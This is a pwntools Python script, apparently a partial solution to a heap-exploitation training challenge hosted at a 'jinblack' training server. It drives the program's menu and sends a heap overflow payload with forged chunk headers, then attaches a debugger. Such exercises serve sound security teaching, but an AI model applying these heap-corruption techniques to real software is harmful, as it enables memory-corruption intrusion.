import time
from pwn import *
import sys

if(len(sys.argv)>1):
	run_local = False
else:
	run_local = True




SIZE=90

if "REMOTE" not in args:
	r= process('./test')
else:
	r = remote("bin.training.jinblack.it",3004)


global pkm_number
pkm_number=0
def alloc0(name,size,art):
	r.recvuntil(b"> ")
	r.sendline(b"0")
	r.recvuntil(b"> ")
	r.sendline(b"%s" % name)
	r.recvuntil(b"> ")
	r.sendline(b"%d" % size)
	sleep(0.1)
	r.send(b"%s" % art)

def edit0(index,name,size,art):
	r.recvuntil(b"> ")
	r.sendline(b"3")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)
	r.recvuntil(b"> ")
	r.sendline(b"%s" % name)
	r.recvuntil(b"> ")
	r.sendline(b"%d" % size)
	sleep(0.1)
	r.send(b"%s" % art)
	print(pkm_number)

def kill0(index):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)

def print2(index):
	r.recvuntil(b"> ")
	r.sendline(b"4")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)
	tounpack=r.recvuntil(b"Name: ")
	print(tounpack)	
	tounpack=r.recvuntil(b">")
	print(tounpack)	



def write0(index,data):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"Index: ")
	r.sendline(b"%d" % index)
	r.recvuntil(b"Content: ")
	r.send(data)
	#r.recvuntil(b"Options: ")[:-len("Options:")]

kill0(0)


alloc0(b'A'*99,0x50,b'A'*0x40)

alloc0(b'B'*99,0x50,b'A'*0x50)


overflow=b'A'*0x50+p64(0)+p64(0x71)+p64(0xc0cababe)+b'C'*0x58+p64(0)+p64(0x61)+b'C'*0x50
overflow+=p64(0)+p64(0x31)+p64(0xc0ca)
edit0(0,b'A'*99,0x150,overflow)
gdb.attach(r)
input("wait")

r.interactive()
